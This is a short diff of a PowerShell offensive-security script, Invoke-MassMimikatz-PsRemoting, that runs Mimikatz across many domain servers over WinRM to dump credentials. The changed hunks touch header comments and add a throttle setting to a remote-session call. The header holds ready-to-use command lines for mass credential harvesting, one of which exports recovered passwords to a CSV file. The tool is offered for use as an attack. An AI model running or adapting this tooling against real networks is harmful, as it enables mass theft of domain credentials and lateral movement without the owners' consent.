@@ -1,4 +1,4 @@
-# shappy script/mods authorized by: Scott Sutherland (@_nullbind), 2015 NetSPI
+# Author: Scott Sutherland (@_nullbind), 2015 NetSPI
 # Description:  This can be used to massmimikatz servers with registered winrm SPNs from a non domain system.
 # Invoke-MassMimikatz-PsRemoting -WinRM -OsFilter "2012" -Verbose -MaxHost 5 -DomainController dc.acme.com -Credential acme\user
 # Invoke-MassMimikatz-PsRemoting -WinRM -OsFilter "2012" -Verbose -MaxHost 5 -DomainController dc.acme.com -Credential acme\user | Export-Csv c:\temp\passwords.csv -NoTypeInformation
@@ -9,7 +9,7 @@
 # Example: PS C:\> Invoke-MassMimikatz-PsRemoting -DomainController dc1.acme.com -Credential acme\user -MaxHost 10 -DomainController 10.1.1.1 -Credential  -verbose
 # Note: this is based on work done by rob fuller, JosephBialek, carlos perez, benjamin delpy, and will schroeder.
 # note: returns data table object.
-# todo: fix psurl, add host opt from pipeline, add from host from file.
+# todo: fix psurl, add host opt from pipeline, add from host pfrom file.
 # Just for fun.
 
 function Invoke-MassMimikatz-PsRemoting
@@ -268,7 +268,7 @@ function Invoke-MassMimikatz-PsRemoting
                 # attempt session
                 [string]$MyComputer = $_.ComputerName    
                 Write-Verbose "Established Sessions: $SessionCount of $MaxHosts - Processing server $Counter of $ServerCount - $MyComputer"         
-                New-PSSession -ComputerName $MyComputer -Credential $Credential -ErrorAction SilentlyContinue | Out-Null          
+                New-PSSession -ComputerName $MyComputer -Credential $Credential -ErrorAction SilentlyContinue -ThrottleLimit $MaxHosts | Out-Null          
             }
         }                   
 
